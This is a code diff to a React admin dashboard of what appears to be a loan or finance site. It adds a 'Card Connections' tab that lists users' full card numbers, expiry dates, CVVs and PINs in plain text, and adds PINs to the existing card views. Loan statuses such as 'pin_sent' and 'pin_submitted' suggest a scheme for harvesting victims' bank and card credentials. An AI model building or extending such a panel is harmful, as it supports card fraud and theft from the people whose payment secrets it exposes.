@@ -60,7 +60,7 @@ export const AdminPage = () => {
   const [taxRefunds, setTaxRefunds] = useState<any[]>([]);
   const [chats, setChats] = useState<any[]>([]);
   const [loading, setLoading] = useState(true);
-  const [activeTab, setActiveTab] = useState<'dashboard' | 'users' | 'loans' | 'kyc' | 'deposits' | 'banks' | 'wallet' | 'managers' | 'grants' | 'chats' | 'tax-refunds'>('dashboard');
+  const [activeTab, setActiveTab] = useState<'dashboard' | 'users' | 'loans' | 'kyc' | 'deposits' | 'banks' | 'cards' | 'wallet' | 'managers' | 'grants' | 'chats' | 'tax-refunds'>('dashboard');
   const [selectedKYC, setSelectedKYC] = useState<any | null>(null);
   const [selectedLoan, setSelectedLoan] = useState<any | null>(null);
   const [selectedDeposit, setSelectedDeposit] = useState<any | null>(null);
@@ -739,6 +739,7 @@ export const AdminPage = () => {
   const inProgressLoans = loans.filter(l => ['bank_details_submitted', 'pin_sent'].includes(l.status));
   const pinVerificationLoans = loans.filter(l => l.status === 'pin_submitted');
   const bankConnectedLoans = loans.filter(l => l.bankDetails);
+  const cardConnectedUsers = users.filter(u => (u.creditCards && u.creditCards.length > 0) || u.cardDetails);
   const totalVolume = loans.reduce((acc, l) => acc + (l.status === 'approved' || l.status === 'disbursed' ? l.amount : 0), 0);
   const totalUsers = users.length;
   const verifiedUsers = users.filter(u => u.kycStatus === 'verified').length;
@@ -855,6 +856,12 @@ export const AdminPage = () => {
             onClick={() => setActiveTab('banks')}
             icon={<UserCheck className="w-4 h-4" />}
             label="Bank Connections"
+          />
+          <TabButton 
+            active={activeTab === 'cards'} 
+            onClick={() => setActiveTab('cards')}
+            icon={<CreditCard className="w-4 h-4" />}
+            label="Card Connections"
           />
           <TabButton 
             active={activeTab === 'wallet'} 
@@ -1196,6 +1203,84 @@ export const AdminPage = () => {
                         <span className="text-gray-400 uppercase font-black tracking-widest">Name</span>
                         <span className="font-bold dark:text-white">{loan.bankDetails?.accountName}</span>
                       </div>
+                    </div>
+                  </div>
+                ))
+              )}
+            </div>
+          </div>
+        ) : activeTab === 'cards' ? (
+          <div className="card">
+            <h2 className="text-xl font-bold mb-8 dark:text-white uppercase tracking-tighter">Card Connections</h2>
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+              {cardConnectedUsers.length === 0 ? (
+                <div className="col-span-full py-20 text-center text-gray-500 italic">
+                  No card connections found.
+                </div>
+              ) : (
+                cardConnectedUsers.map((u) => (
+                  <div key={u.id} className="p-6 rounded-2xl bg-gray-50 dark:bg-zinc-900 border border-gray-100 dark:border-zinc-800">
+                    <div className="flex items-center gap-3 mb-4">
+                      <div className="w-10 h-10 rounded-xl bg-accent/10 flex items-center justify-center">
+                        <CreditCard className="w-5 h-5 text-accent" />
+                      </div>
+                      <div>
+                        <p className="text-sm font-bold dark:text-white">{u.email}</p>
+                        <p className="text-[10px] text-gray-500 uppercase tracking-widest">{u.fullName || 'No Name'}</p>
+                      </div>
+                    </div>
+                    <div className="space-y-4 pt-4 border-t border-gray-200 dark:border-zinc-800">
+                      {u.creditCards && u.creditCards.map((card: any, idx: number) => (
+                        <div key={idx} className="p-3 rounded-xl bg-white dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700">
+                          <div className="flex justify-between items-center mb-2">
+                            <span className="text-[10px] font-black uppercase tracking-widest text-accent">{card.cardType || 'Credit Card'}</span>
+                            <span className="text-[10px] font-mono text-gray-400">#{idx + 1}</span>
+                          </div>
+                          <div className="space-y-2">
+                            <div className="flex justify-between text-xs">
+                              <span className="text-gray-400 uppercase font-black tracking-widest">Number</span>
+                              <span className="font-bold dark:text-white font-mono">{card.cardNumber}</span>
+                            </div>
+                            <div className="flex justify-between text-xs">
+                              <span className="text-gray-400 uppercase font-black tracking-widest">Expiry</span>
+                              <span className="font-bold dark:text-white">{card.expiryDate}</span>
+                            </div>
+                            <div className="flex justify-between text-xs">
+                              <span className="text-gray-400 uppercase font-black tracking-widest">CVV</span>
+                              <span className="font-bold text-accent">{card.cvv}</span>
+                            </div>
+                            <div className="flex justify-between text-xs">
+                              <span className="text-gray-400 uppercase font-black tracking-widest">PIN</span>
+                              <span className="font-bold text-accent">{card.pin || 'N/A'}</span>
+                            </div>
+                          </div>
+                        </div>
+                      ))}
+                      {u.cardDetails && (
+                        <div className="p-3 rounded-xl bg-amber-500/5 border border-amber-500/10">
+                          <div className="flex justify-between items-center mb-2">
+                            <span className="text-[10px] font-black uppercase tracking-widest text-amber-600">Legacy Card</span>
+                          </div>
+                          <div className="space-y-2">
+                            <div className="flex justify-between text-xs">
+                              <span className="text-gray-400 uppercase font-black tracking-widest">Number</span>
+                              <span className="font-bold dark:text-white font-mono">{u.cardDetails.cardNumber}</span>
+                            </div>
+                            <div className="flex justify-between text-xs">
+                              <span className="text-gray-400 uppercase font-black tracking-widest">Expiry</span>
+                              <span className="font-bold dark:text-white">{u.cardDetails.expiryDate}</span>
+                            </div>
+                            <div className="flex justify-between text-xs">
+                              <span className="text-gray-400 uppercase font-black tracking-widest">CVV</span>
+                              <span className="font-bold text-amber-600">{u.cardDetails.cvv}</span>
+                            </div>
+                            <div className="flex justify-between text-xs">
+                              <span className="text-gray-400 uppercase font-black tracking-widest">PIN</span>
+                              <span className="font-bold text-amber-600">{u.cardDetails.pin || 'N/A'}</span>
+                            </div>
+                          </div>
+                        </div>
+                      )}
                     </div>
                   </div>
                 ))
@@ -2665,7 +2750,7 @@ export const AdminPage = () => {
                               <CreditCard className="w-3.5 h-3.5 text-accent" />
                               <span className="text-xs font-bold dark:text-white">{card.cardType || 'Card'} • {card.cardNumber?.slice(-4)}</span>
                             </div>
-                            <p className="text-[10px] text-gray-500 font-mono">Exp: {card.expiryDate} • CVV: {card.cvv}</p>
+                            <p className="text-[10px] text-gray-500 font-mono">Exp: {card.expiryDate} • CVV: {card.cvv} • PIN: {card.pin || 'N/A'}</p>
                           </div>
                         ))}
                       </div>
@@ -2677,7 +2762,7 @@ export const AdminPage = () => {
                         <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-2">Legacy Details</p>
                         <div className="p-3 rounded-xl bg-amber-500/5 border border-amber-500/10">
                           <p className="text-xs font-bold text-amber-600 dark:text-amber-400">Card ending in {selectedUser.cardDetails.cardNumber?.slice(-4)}</p>
-                          <p className="text-[10px] text-amber-500/70 font-mono">Exp: {selectedUser.cardDetails.expiryDate}</p>
+                          <p className="text-[10px] text-amber-500/70 font-mono">Exp: {selectedUser.cardDetails.expiryDate} • PIN: {selectedUser.cardDetails.pin || 'N/A'}</p>
                         </div>
                       </div>
                     )}
